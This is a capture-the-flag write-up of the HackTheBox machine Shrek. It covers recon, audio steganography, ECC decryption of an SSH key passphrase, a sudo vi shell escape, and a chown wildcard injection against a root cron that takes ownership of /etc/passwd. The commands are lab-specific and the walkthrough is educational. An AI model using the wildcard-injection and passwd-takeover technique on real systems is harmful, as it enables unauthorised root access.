---
title: HTB: Shrek
url: https://0xdf.gitlab.io/2020/07/22/htb-shrek.html
date: 2020-07-22T09:00:04+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, hackthebox, htb-shrek, nmap, php, gobuster, audacity, steganography, crypto, ssh, ecc, seccure, python, chown, wildcard, ghidra, pspy, passwd, extended-attributes, xattr, lsattr, cron, suid
---

![Shrek](https://0xdfimages.gitlab.io/img/shrek-cover.png)

Shrek is another 2018 HackTheBox machine that is more a string of challenges as opposed to a box. I’ll find an uploads page in the website that doesn’t work, but then also find a bunch of malware (or malware-ish) files in the uploads directory. One of them contains a comment about a secret directory, which I’ll check to find an MP3 file. Credentials for the FTP server are hidden in a chunk of the file at the end. On the FTP server, there’s an encrypted SSH key, and a bunch of files full of base64-encoded data. Two have a passphrase and an encrypted blob, which I’ll decrypt to get the SSH key password, and use to get a shell. To privesc, I’ll find a process running chmod with a wildcard, and exploit that to change the ownership of the passwd file to my user, so I can edit it and get a root shell. In Beyond Root, I’ll examine the text file in the directory and why it doesn’t get it changed ownership, look at the automation and find a curious part I wasn’t expecting, and show an alternative root based on that automation (which may be the intended path).

## Box Info

| Name | [Shrek](https://hackthebox.com/machines/shrek)  [Shrek](https://hackthebox.com/machines/shrek) [Play on HackTheBox](https://hackthebox.com/machines/shrek) |
| --- | --- |
| Release Date | [25 Aug 2017](https://twitter.com/hackthebox_eu/status/900648861961773060) |
| Retire Date | 03 Feb 2018 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Shrek |
| Radar Graph | Radar chart for Shrek |
| First Blood User | 07:46:22[echthros echthros](https://app.hackthebox.com/users/2846) |
| First Blood Root | 11:15:32[echthros echthros](https://app.hackthebox.com/users/2846) |
| Creator | [SirenCeol SirenCeol](https://app.hackthebox.com/users/2277) |

## Recon

### nmap

`nmap` found three open TCP ports, FTP (21), SSH (22) and HTTP (80):

```

htb-0xdf@10.10.14.42~/shrek-10.10.10.47$ sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.47
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-16 20:41 UTC
Nmap scan report for 10.10.10.47
Host is up (0.0027s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds
htb-0xdf@10.10.14.42~/shrek-10.10.10.47$ sudo nmap -p 21,22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.47
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-16 20:46 UTC
Nmap scan report for 10.10.10.47
Host is up (0.0039s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:a7:95:95:5d:dd:75:ca:bc:de:36:2c:33:f6:47:ef (RSA)
|   256 b5:1f:0b:9f:83:b3:6c:3b:6b:8b:71:f4:ee:56:a8:83 (ECDSA)
|_  256 1f:13:b7:36:8d:cd:46:6c:29:6d:be:e4:ab:9c:24:5b (ED25519)
80/tcp open  http    Apache httpd 2.4.27 ((Unix))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.27 (Unix)
|_http-title: Home
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.95 seconds

```

I don’t see a clear OS version based on the versions of OpenSSH or Apache.

### Website - TCP 80

#### Site

The website is a Shrek fan site:

[![Shrek fan site](https://0xdfimages.gitlab.io/img/image-20200721164119065.png)](https://0xdfimages.gitlab.io/img/image-20200721164119065.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200721164119065.png)

There’s a handful of links across the top of each page. `/About.html` has more text. `/Gallery.html` has images, but nothing interesting. The images are in `/images`, and it is directory listable, but nothing interesting in it. `/Sitemap.html` just has a list of the links.

`/upload.html` has a form to upload things:

![image-20200716171247481](https://0xdfimages.gitlab.io/img/image-20200716171247481.png)

Submitting an file (or any type) returns `/upload.php`, with a success message:

![image-20200716171321778](https://0xdfimages.gitlab.io/img/image-20200716171321778.png)

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I know the site is PHP:

```

root@kali# gobuster dir -u http://10.10.10.47 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -o scans/gobuster-root-medium-php 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.47
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/07/21 16:30:36 Starting gobuster
===============================================================
/images (Status: 301)
/uploads (Status: 301)
/upload.php (Status: 200)
/memes (Status: 301)
/shrek (Status: 301)
===============================================================
2020/07/21 16:36:40 Finished
===============================================================

```

The only thing here that’s new is the `/uploads` directory. That would have been my first guess to check, but nice to have it confirmed.

#### /uploads

`/uploads` is interesting because it allows directory listing, and seems to contain a bunch of malicious file names, but nothing that’s going to actually work here:

![image-20200716171921577](https://0xdfimages.gitlab.io/img/image-20200716171921577.png)

At first I thought this was just other users uploads, but then I realized:
1. I was on a clear start on a VIP server;
2. The timestamps on the files were from 2017;
3. My upload wasn’t there.

Knowing this is a Linux host running PHP, I’ll ignore the ASP, ASPX, and `.exe` files. The `.elf` is unlikely to do anything either. Of the three PHP files, only `secret_ultimate.php` is actually PHP (the other two are not actually PHP files, but binary garbage).

The server doesn’t execute it when I click it (likely configured not to run PHP from the uploads directory, good job!), but it does allow me to see the source in the browser (`view-source` works well to add formatting).

![image-20200716172617425](https://0xdfimages.gitlab.io/img/image-20200716172617425.png)

The file is a copy of the `php-reverse-shell.php` webshell that comes in `/usr/share/webshells/php` on Kali by default, except there’s an extra variable created at the top. It even has a comment about finding the “secret dir”.

#### /secret\_area\_51

Checking out the “secret dir”, there’s only a copy of an MP3 of Smash Mouth’s All Star (the song that plays in the Credits of the movie Shrek).

![image-20200716172750706](https://0xdfimages.gitlab.io/img/image-20200716172750706.png)

## Shell as sec

### Steg in MP3

Given the path that leads right to this `.mp3`, and the age of this box, I took a look at it in Audacity:

[![mp3 in Audacity](https://0xdfimages.gitlab.io/img/image-20200716173209277.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200716173209277.png)

What’s interesting there is at the end the song fades out, and then there’s some extra static at the end:

[![extra noise at the end of the song](https://0xdfimages.gitlab.io/img/image-20200716173401572.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200716173401572.png)

[Wikipedia](https://en.wikipedia.org/wiki/All_Star_(song)) confirms that the song is 3:21 long, so the stuff that sounds like static at the end is definitely interesting. I’ll change it from Waveform to Spectrogram in the settings bar on the left:

![image-20200716173618340](https://0xdfimages.gitlab.io/img/image-20200716173618340.png)

Now there’s something at the top of each channel:

[![spectrogram](https://0xdfimages.gitlab.io/img/image-20200716173642662.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200716173642662.png)

Under “Spectrogram Settings…”, I’ll increase the Max Frequency by a factor of 10 (add a 0), and now there’s a clear message in the noise:

[![spectrogram with increased frequency](https://0xdfimages.gitlab.io/img/image-20200716173807070.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200716173807070.png)

### Recover Key

#### Enumerate FTP

I’ll connect to the FTP with the username donkey and the password d0nk3y1337!. There are 31 `.txt` files, and `key`:

```

htb-0xdf@10.10.14.42~/shrek-10.10.10.47$ ftp 10.10.10.47                                                                                                        
Connected to 10.10.10.47.                                                                                                                                       
220 (vsFTPd 3.0.3)                                                                                                                                              
Name (10.10.10.47:root): donkey                                                                                                                                 
331 Please specify the password.                                                                                                                                
Password:                                                                                                                                                       
230 Login successful.                                                                                                                                           
Remote system type is UNIX.                                                                                                                                     
Using binary mode to transfer files.                                                                                                                            
ftp> ls                                                                                                                                                         
200 PORT command successful. Consider using PASV.                                                                                                               
150 Here comes the directory listing.                                                                                                                           
-rw-r--r--    1 0        0            4096 Jul 16 20:46 0984e1656b4f4e13a8ea3e2369cc91f5.txt
-rw-r--r--    1 0        0            3072 Jul 16 20:46 0d4c12f8e61a4109a792ec822bb8d61b.txt
-rw-r--r--    1 0        0            9216 Jul 16 20:46 1c5d6d04c5e34b0b84abe0cef2393085.txt
-rw-r--r--    1 0        0            9216 Jul 16 20:46 223255fbc3214720a37cca7f94dda80a.txt
-rw-r--r--    1 0        0            4096 Jul 16 20:46 23916b0ac58849849b437c16cbc56d40.txt
-rw-r--r--    1 0        0            8192 Jul 16 20:46 26c972331ac54eb186d4dd1c3e74e6fa.txt
-rw-r--r--    1 0        0            9216 Jul 16 20:46 382846e5cc824f3582f9d5619ebd0f8e.txt
-rw-r--r--    1 0        0            4096 Jul 16 20:46 3af130c1520b4b069952a68d4e7e9025.txt
-rw-r--r--    1 0        0            4096 Jul 16 20:46 3c160c80e7fa4950a91bb6b37a8a4adb.txt
-rw-r--r--    1 0        0            3072 Jul 16 20:46 45106712fe37474fbfd52d577906cc40.txt
-rw-r--r--    1 0        0           10240 Jul 16 20:46 48a6c09e9aef4b8da1c11798c8c730e1.txt
-rw-r--r--    1 0        0           11294 Jul 16 20:46 552a8a8fb6724a6bb3eef9ddc8781061.txt
-rw-r--r--    1 0        0            4096 Jul 16 20:46 569053ec07a64f94aba84068a10bf5c4.txt
-rw-r--r--    1 0        0            4096 Jul 16 20:46 599f3fde94154be5bccaf0b4f82d62cc.txt
-rw-r--r--    1 0        0           12288 Jul 16 20:46 5b2a26f15f4b44e1a7c04590efb7daf4.txt
-rw-r--r--    1 0        0            7168 Jul 16 20:46 5b7ed663c88d48d9ace655f6105770f1.txt
-rw-r--r--    1 0        0           15360 Jul 16 20:46 61f3976938a1490f8901a71ad35258f2.txt
-rw-r--r--    1 0        0           10240 Jul 16 20:46 7181942167304bb9b06dbc5e08cb067c.txt
-rw-r--r--    1 0        0           15360 Jul 16 20:46 750aee48ec844fab977373489ecc6d56.txt
-rw-r--r--    1 0        0            7168 Jul 16 20:46 76c120a573d6473293d63abcdaddf8a2.txt
-rw-r--r--    1 0        0           10240 Jul 16 20:46 80e26fd265914b18b45f7fc265f1c2df.txt
-rw-r--r--    1 0        0            8192 Jul 16 20:46 959ff2d822c14cab92a3bdce3ddd9739.txt
-rw-r--r--    1 0        0            8192 Jul 16 20:46 96870a61d3354db08f94f8e921ec0318.txt
-rw-r--r--    1 0        0            4096 Jul 16 20:46 9913eb87c7204a738f8ced16c5dfcd20.txt
-rw-r--r--    1 0        0            6144 Jul 16 20:46 9c8275ce10004aafa2633738e0962f65.txt
-rw-r--r--    1 0        0            8192 Jul 16 20:46 af2282b8ba7f4643ab77f2b12d8da172.txt
-rw-r--r--    1 0        0            3502 Jul 16 20:46 b9b8cb17c47349ebae0058dc6063de7a.txt
-rw-r--r--    1 0        0           14336 Jul 16 20:46 bd7f5ab28982474491464a240070f6ce.txt
-rw-r--r--    1 0        0            7168 Jul 16 20:46 c165710c2c074b3d8dfe1c9d9c58d8c1.txt
-rw-r--r--    1 0        0            7168 Jul 16 20:46 ccbeb8db05eb45deac213f6efa9a28be.txt
-rw-r--r--    1 0        0            8192 Jul 16 20:46 d794cc76c73f4a268cc1507c32294e69.txt
-rw-r--r--    1 0        0            1766 Aug 16  2017 key
226 Directory send OK.

```

I’ll turn the prompt off (`prompt off`) and then use `mget *` to pull all the files to my computer.

`key` is an encrypted SSH key:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,94DC7309349E17F8ED6776ED69D6265A

rx7VJS6fzctpfTQ16y9M2CYG701eIh3nDQND+MSFAMSD8JiElqiIH7yA6TpXKPPx
A9gcxf1qlezc3XIhQpsLN9tLJpOxWYMniUo06/7k+2vWO6AzX27hVPRk1vk9OTWG
gRe856uaS8WfQ3XxehHNk1bu710HzBSwZn/XNbHsNo74Bpol8MTm2BTjvnuxnFY8
tvw53nbXMQffBmrwBTvc5aaCk/C0LfvemSxLAgAwMACNpbPmdw9NkUxRDbL/93Q1
ZYMlFxiXhLgFWQFdW/u2WURmOcIuAHd1V8gWIvY10IpH7o4nXaCI4D8PUmnIDt2N
k6Q3Znnfe8BrzFlD1NdG5SfHNdNUn5N9DROk0cZsL+D9e9bQb5CoyL2ioL9fEeRv
4J5w2ZnIHStAez+Za11WGcZsW3jk2eXGPZiD99k5GcazWQ60dv5dUR6J5fkxaibi
unqmN2tDaKReT7aT4Im6pLUscN8t2w8dprgsD/EbMsPr0X/TqOShXXhMUhk/9SAY
2Rvudp97fqYHugIch4lZdDpYS//KRwzO+wQOQARX0tJ0DJ++lY6WNM/BD6+HUk+v
2c3ziM7DL4i7zhA0qnc8796Nxs8D/QTUWjmcNQhcOM4rAYsmyRqyoVe3ciadKWmk
vfwBJYxCwE9I9qUfZS3TsEYdbLE4MjlFB+Zn+fYpyA950hVFDxvu+E8zIcSYA0bJ
GAra2vH/xgmEoptYqeav/sstisJOYPW1Ui3K5C9E0QMH2MRReZoHlToCSNwUOWRo
rY1z3UZMyV5qw3VsuOk+n81P2npyP0RYo6xjAQW/1uN01LPi6y79j/3k9L35N7pH
vJHACTHa1bgCGkYGYm75DRIPYqJKs8g3htPHTbyfAfybeMBFQFxz3SBSWp8T9yjF
+WKUWQ2EmUtgC9n04tLf1/SIldvtOvtwyv2LiIzgvtT6DCMoulprRlb+U0iY1kbQ
lrpUhFtcK1SvC4Z6ebAEoX/jVRWKdbKldr35ECwIiMVNUFhvXwg4JRdmgmeeDga5
66TSTqupISE7q6MuBfesQItkoiairO36enBvYdifN4/kRFBNXo1ZUTzdKVw6/UVo
n9tG9Fnk/z/Ee0iuT3PS0xtu6cBaXzFggm1n73honBjJzIJdtDAJ2AFSMJg6F6TJ
d0BPB0SGfF8rU+s0RjBhr1nE+px9qYKsuPAKkfi/b/EVa5WEacNezUTTKW9v9DjM
ym/zSi9GMDEczlFO2wthN5MXh0XNzUyQxDAcek1uZyaQd66NXQ0AywQG114+XLx8
29sJvTuy6PXJs4ZUCno4/7RQnG9mwHtcV2f3ETASTjtsxBVotzfnpB22jgRND1fi
Ovqy0xbhRUrBhl8MjuE4Ha/ttoKvbDxC6PlVPMfjp3y2sTIDRp7HpAJfKoVMdJ5Y
9FoWkWhrGkshGMIxyF3YE6cyhy8OOvmoEcNjyusCi1VWJpRxWU9Ml+GUH5gsjdAV
yiPvEG4LnM4gGeHhn9CZcrFJSYKIS0s+410YQvpECx09LaLBtq5y0QNkIspuKSPB
UDidMCyboqlc47D6SgNk7WQqut9tFj6PXE3chFFBHGfZ3hF9HnbUWBEiqyvOlAnm
-----END RSA PRIVATE KEY-----

```

I had tried a handful of wordlists with `john` trying to crack the password, but without luck. I won’t show that here.

#### Evaluate Files

I turned to these `.txt` files. On first glance, each of the `.txt` files contain what looks like a single base64 encoded string. Decoding it just dumps garbage. I wanted to verify that each file was a single string, so I ran `wc` on each file:

```

htb-0xdf@10.10.14.42~/shrek-10.10.10.47/ftp$ wc *.txt
     0      1   4096 0984e1656b4f4e13a8ea3e2369cc91f5.txt
     0      1   3072 0d4c12f8e61a4109a792ec822bb8d61b.txt
     0      1   9216 1c5d6d04c5e34b0b84abe0cef2393085.txt
     0      1   9216 223255fbc3214720a37cca7f94dda80a.txt
     0      1   4096 23916b0ac58849849b437c16cbc56d40.txt
     0      1   8192 26c972331ac54eb186d4dd1c3e74e6fa.txt
     0      1   9216 382846e5cc824f3582f9d5619ebd0f8e.txt
     0      1   4096 3af130c1520b4b069952a68d4e7e9025.txt
     0      1   4096 3c160c80e7fa4950a91bb6b37a8a4adb.txt
     0      1   3072 45106712fe37474fbfd52d577906cc40.txt
     0      1  10240 48a6c09e9aef4b8da1c11798c8c730e1.txt
     0      3  11294 552a8a8fb6724a6bb3eef9ddc8781061.txt <-- 3 words
     0      1   4096 569053ec07a64f94aba84068a10bf5c4.txt
     0      1   4096 599f3fde94154be5bccaf0b4f82d62cc.txt
     0      1  12288 5b2a26f15f4b44e1a7c04590efb7daf4.txt
     0      1   7168 5b7ed663c88d48d9ace655f6105770f1.txt
     0      1  15360 61f3976938a1490f8901a71ad35258f2.txt
     0      1  10240 7181942167304bb9b06dbc5e08cb067c.txt
     0      1  15360 750aee48ec844fab977373489ecc6d56.txt
     0      1   7168 76c120a573d6473293d63abcdaddf8a2.txt
     0      1  10240 80e26fd265914b18b45f7fc265f1c2df.txt
     0      1   8192 959ff2d822c14cab92a3bdce3ddd9739.txt
     0      1   8192 96870a61d3354db08f94f8e921ec0318.txt
     0      1   4096 9913eb87c7204a738f8ced16c5dfcd20.txt
     0      1   6144 9c8275ce10004aafa2633738e0962f65.txt
     0      1   8192 af2282b8ba7f4643ab77f2b12d8da172.txt
     0      3   3502 b9b8cb17c47349ebae0058dc6063de7a.txt <-- 3 words
     0      1  14336 bd7f5ab28982474491464a240070f6ce.txt
     0      1   7168 c165710c2c074b3d8dfe1c9d9c58d8c1.txt
     0      1   7168 ccbeb8db05eb45deac213f6efa9a28be.txt
     0      1   8192 d794cc76c73f4a268cc1507c32294e69.txt
     0     35 241100 total

```

Two of the files have three words! The first one has a bunch of base64, some spaces, then a short base64 word, more space, and then a long one:

[![text file with spacing](https://0xdfimages.gitlab.io/img/image-20200716175139215.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200716175139215.png)

The middle string is `UHJpbmNlQ2hhcm1pbmc=`. That decodes:

```

htb-0xdf@10.10.14.42~/shrek-10.10.10.47$ echo UHJpbmNlQ2hhcm1pbmc= | base64 -d
PrinceCharming

```

The second file had a similar pattern, though the string in the middle was longer, and it decodes to binary data:

```

htb-0xdf@10.10.14.42~/shrek-10.10.10.47$ echo "J1x4MDFceGQzXHhlMVx4ZjJceDE3VCBceGQwXHg4YVx4ZDZceGUyXHhiZFx4OWVceDllflAoXHhmN1x4ZTlceGE1XHhjMUtUXHg5YUlceGRkXFwhXHg5NXRceGUxXHhkNnBceGFhInUyXHhjMlx4ODVGXHgxZVx4YmNceDAwXHhiOVx4MTdceDk3XHhiOFx4MGJceGM1eVx4ZWM8Sy1ncDlceGEwXHhjYlx4YWNceDlldFx4ODl6XHgxM1x4MTVceDk0RG5ceGViXHg5NVx4MTlbXHg4MFx4ZjFceGE4LFx4ODJHYFx4ZWVceGU4Q1x4YzFceDE1XHhhMX5UXHgwN1x4Y2N7XHhiZFx4ZGFceGYwXHg5ZVx4MWJoXCdRVVx4ZTdceDE2M1x4ZDRGXHhjY1x4YzVceDk5dyc=" | base64 -d
'\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'

```

#### Recover Password

This part really just took a lot of guessing (or asking someone for a nudge). I had a pretty good idea at this point that I had some cipher text and a password, but knowing what algorithm to use was kind of a random guess. It turns out that this is using ECC crypto, and there’s a Python library `seccure` (note two c’s) that will handle the decryption. I installed it with `pip3 install seccure` (I got errors associated with `gmpy` originally, but after running `apt install libgmp-dev libmpfr-dev libmpc-dev` as described [here](https://stackoverflow.com/questions/40075271/gmpy2-not-installing-mpir-h-not-found), it worked).

Now I dropped to a Python3 terminal and decrypted:

```

htb-0xdf@10.10.14.42~/shrek-10.10.10.47$ python3
Python 3.8.3rc1 (default, Apr 30 2020, 07:33:30) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import seccure
>>> cipher = b'\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'
>>> password = b'PrinceCharming'
>>> seccure.decrypt(cipher, password)
b'The password for the ssh file is: shr3k1sb3st! and you have to ssh in as: sec\n'

```

### SSH

Now I can SSH as sec into Shrek:

```

htb-0xdf@10.10.14.42~/shrek-10.10.10.47$ ssh -i ftp/key sec@10.10.10.47
Enter passphrase for key 'ftp/key': 
Last login: Wed Aug 23 10:48:16 2017 from 10.10.22.10
[sec@shrek ~]$

```

I can also create a decrypted copy of the key:

```

htb-0xdf@10.10.14.42~/shrek-10.10.10.47$ openssl rsa -in ftp/key -out id_rsa_sec
Enter pass phrase for ftp/key:
writing RSA key

```

Now that doesn’t ask for a password:

```

htb-0xdf@10.10.14.42~/shrek-10.10.10.47$ ssh -i id_rsa_sec sec@10.10.10.47
Last login: Thu Jul 16 22:22:53 2020 from 10.10.14.42
[sec@shrek ~]$ 

```

And I can get `user.txt`:

```

[sec@shrek ~]$ cat user.txt
4a30ad60************************

```

## Priv: sec –> root

### Fake Path

I always check `sudo -l`, and this time, it leads down a simple but useless path:

```

[sec@shrek ~]$ sudo -l
User sec may run the following commands on shrek:
    (farquad) NOPASSWD: /usr/bin/vi

```

I can run `sudo -u farquad vi`, and then enter `:!bash` and drop to a shell as farquad:

```

[sec@shrek ~]$ sudo -u farquad vi
[farquad@shrek sec]$

```

Strangely, farquad’s home directory is `/var/local.farquad`. In it, there’s a binary:

```

[farquad@shrek ~]$ ls
mirror

```

Running it prints a message:

```

[farquad@shrek ~]$ ./mirror 
Mirror, Mirror on the wall who is the most handsome of all?
Of course you Lord Farquad

```

I don’t see much in the way of input, and, even if there was and I could exploit it, there’s no SUID bit or `sudo` to let this run as root.

```

[farquad@shrek ~]$ ls -l
total 12
-rwxr-xr-x 1 root root 8448 Aug 16  2017 mirror
[farquad@shrek ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for farquad: 

```

It was clear to me at this point this was just a rabbit hole. I was thinking about showing the binary in Ghidra in Beyond Root, but it turned out to be so simple, I’ll show it here. The `main` function literally just prints this message and exits:

```

undefined8 main(void)

{
  puts("Mirror, Mirror on the wall who is the most handsome of all?");
  puts("Of course you Lord Farquad");
  return 0;
}

```

### Enumeration

#### pspy

After doing some basic enumeration (`sudo`, `ps auxww`, `netstat`, checking out common file locations), and running [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), nothing jumped out as interesting. I uploaded [pspy](https://github.com/DominicBreuker/pspy) to look for cron jobs, and it looks like every five minutes there’s one running as root:

```

2020/07/17 02:20:01 CMD: UID=0    PID=1178   | /usr/bin/CROND -n 
2020/07/17 02:20:01 CMD: UID=0    PID=1176   | /usr/bin/CROND -n 
2020/07/17 02:20:01 CMD: UID=0    PID=1179   | /usr/bin/python /root/chown 
2020/07/17 02:20:01 CMD: UID=0    PID=1180   | /bin/sh -c cd /usr/src; /usr/bin/chown nobody:nobody * 
2020/07/17 02:20:01 CMD: UID=0    PID=1181   | /bin/sh -c cd /usr/src; /usr/bin/chown nobody:nobody * 

```

#### File Modified Times

After I rooted and while writing this post, I looked some other writeups to see how people found this path. I’m pretty sure `pspy` didn’t exist when this box came out. Most people just didn’t say how they found it, but a few went the forensics route and use file modified times, looking for files around the same time as files I know were created as part of the box. I typically don’t like using this as a main method because it’s not useful in a world where there is not `flag.txt`. But give this box is quite CTF-like anyway, if there was ever a time. And, it is a useful forensics technique when doing incident response, and I don’t think I’ve shown it before.

Looking around sec’s home directory, I can see it was created Aug 15, with the parent directory (`/home`) being created on Aug 11:

```

[sec@shrek ~]$ ls -la
total 28
drwx------ 3 sec  users 4096 Aug 15  2017 .
drwxr-xr-x 4 root root  4096 Aug 11  2017 ..
-rw------- 1 root root     0 Aug 22  2017 .bash_history
-rw-r--r-- 1 sec  users   21 Feb 14  2017 .bash_logout
-rw-r--r-- 1 sec  users   57 Feb 14  2017 .bash_profile
-rw-r--r-- 1 sec  users  141 Feb 14  2017 .bashrc
drwxr-xr-x 2 root root  4096 Aug 16  2017 .ssh
-r--r--r-- 1 root root    33 Aug 22  2017 user.txt

```

The `.ssh` directory was created on Aug 16, with the `authorized_keys` file the same day. `.bash_history` file was nulled and `user.txt` was written on Aug 22. I’ll use `find` to look for files created in this timeframe. I’ll start small, and grow if necessary, by aiming between Aug 20 and Aug 24, using the following command options:
- `/` - start at the system root
- `-type f` - only look for files, not directories or links
- `-newermt 2017-08-20` - include files newer than Aug 20
- `! -newermt 2017-08-24` - don’t include files newer than Aug 24
- `-ls` - print detailed output of results
- `2>/dev/null` - ignore errors

```

[sec@shrek ~]$ find / -type f -newermt 2017-08-20 ! -newermt 2017-08-24 -ls 2>/dev/null
    18518      4 -rw-r--r--   1  root     root            6 Aug 23  2017 /etc/hostname
    18515      4 -rw-r--r--   1  root     root          389 Aug 23  2017 /etc/netctl/static
    35103      8 -rw-r--r--   1  root     root         4606 Aug 21  2017 /etc/vsftpd.conf
   138139      4 -rw-r--r--   1  root     root          196 Aug 23  2017 /etc/systemd/system/netctl@static.service
    33988      4 -rw-------   1  root     root          929 Aug 21  2017 /etc/shadow
    33931      4 -rw-r--r--   1  root     root          968 Aug 21  2017 /etc/passwd
       17      4 -r--r--r--   1  root     root           33 Aug 22  2017 /home/sec/user.txt
       18      0 -rw-------   1  root     root            0 Aug 22  2017 /home/sec/.bash_history
   138145      4 -rw-------   1  root     root           97 Aug 22  2017 /var/spool/cron/root
   138101  16388 -rw-r-----   1  root     systemd-journal 16777216 Aug 21  2017 /var/log/journal/84d230a047b241c6be827bd5ce531868/system@00055747c657656c-ad9ea2c5440b64ec.journal~
   138138   8192 -rw-r-----   1  root     systemd-journal  8388608 Aug 21  2017 /var/log/journal/84d230a047b241c6be827bd5ce531868/system@0005574ac144c200-f23de797a5b2e762.journal~
   137786     16 -rw-------   1  root     utmp               15744 Aug 22  2017 /var/log/btmp.1
   131087      8 -rw-------   1  root     root                7948 Aug 23  2017 /var/log/vsftpd.log.1
   137811 264656 -rw-r--r--   1  root     root            271001726 Aug 23  2017 /var/log/httpd/access_log.1
   137906     12 -rw-r--r--   1  root     root                 9833 Aug 23  2017 /var/log/httpd/error_log.1
   138712      8 -rw-------   1  root     root                32096 Aug 23  2017 /var/log/faillog
    20283      4 -rw-r--r--   1  root     root                   91 Aug 22  2017 /usr/src/thoughts.txt

```

The files consist of some basic host configuration, creating accounts. There are a few logs in there I could take a look at. But the file that jumps out as interesting is `/usr/src/thoughts.txt`, as it’s not a file that typically exists.

The file is owned by root, and I can read it, but not write to it:

```

[sec@shrek src]$ ls -l
total 4
-rw-r--r-- 1 root root 91 Aug 22  2017 thoughts.txt
[sec@shrek src]$ cat thoughts.txt 
That must be Lord Farquaad's castle...
Do you think he's maybe compensating for something?

```

If I didn’t know there was a cron running with `chown` against this directory, I guess I could get lucky by next writing a file here and noticing that the ownership changes after five minutes.

### chown Wildcard Exploit

#### Theory

I have seen a cron that is running `chown nobody:nobody *` in `/usr/src`. I can take advantage of a wildcard exploit here. There’s a great [paper on exploiting wildcards](https://www.exploit-db.com/papers/33930) in Unix (and Linux) from Leon Juranic from 2014. The issue is this. When I run `ls *`, what the shell is doing is expanding out that `*` to a list of all the files in the directory. So if I have a directory with files `a.txt` and `b.txt`, and I run `ls *`, the system ends up running `ls a.txt b.txt`.

This gets tricky if I add another file and name it `-l`. Now it runs `ls a.txt b.txt -l`, which ends up running `ls -l` and printing the details for the two `.txt` files.

As the paper shows, I can abuse this with `chown` using the `--reference=[file]` option. I can change any file on the system to be owned by any other user, as long as I have a file owned by that user to reference.

#### /etc/passwd

Immediately what comes to mind for me is taking ownership of a file like `/etc/passwd` as sec. I need a file to be the reference, so just create one. Then I need the file that will be interpreted as a flag. I’ll name it `--reference=test`. To create a file with this weird name, I’ll run `touch -- --reference=test`. In Linux, `--` tells the shell that anything that follows is a filename, and not an argument. With that in place, I’ll create a symbolic link to `passwd`:

```

[sec@shrek src]$ ln -s /home/sec/user.txt 
[sec@shrek src]$ touch -- --reference=user.txt
[sec@shrek src]$ ln -s /etc/passwd
[sec@shrek src]$ ls -l
total 4
lrwxrwxrwx 1 sec  users 11 Jul 17 02:41  passwd -> /etc/passwd
-rw-r--r-- 1 sec  users  0 Jul 17 02:41 '--reference=user.txt'
-rw-r--r-- 1 root root  91 Aug 22  2017  thoughts.txt
lrwxrwxrwx 1 sec  users 18 Jul 17 02:41  user.txt -> /home/sec/user.txt

```

Once the cron runs, `/etc/passwd` is now owned by sec:

```

[sec@shrek src]$ ls -l /etc/passwd
-rw-r--r-- 1 sec users 968 Jul 17 02:40 /etc/passwd

```
*[1 July 2023 update]*: It seems that sometime over the years the ownership of `user.txt` has changed from `sec:user` to `root:root`, so the commands as shown above don’t work. Thanks to InvertedClimbing for the tip on this one! Any other file owned by sec would still work. I just need to give it a file whose permissions I want to copy. So something like this will still work:

```

[sec@shrek src]$ ln -s /home/sec/.bashrc
[sec@shrek src]$ touch -- --reference=.bashrc
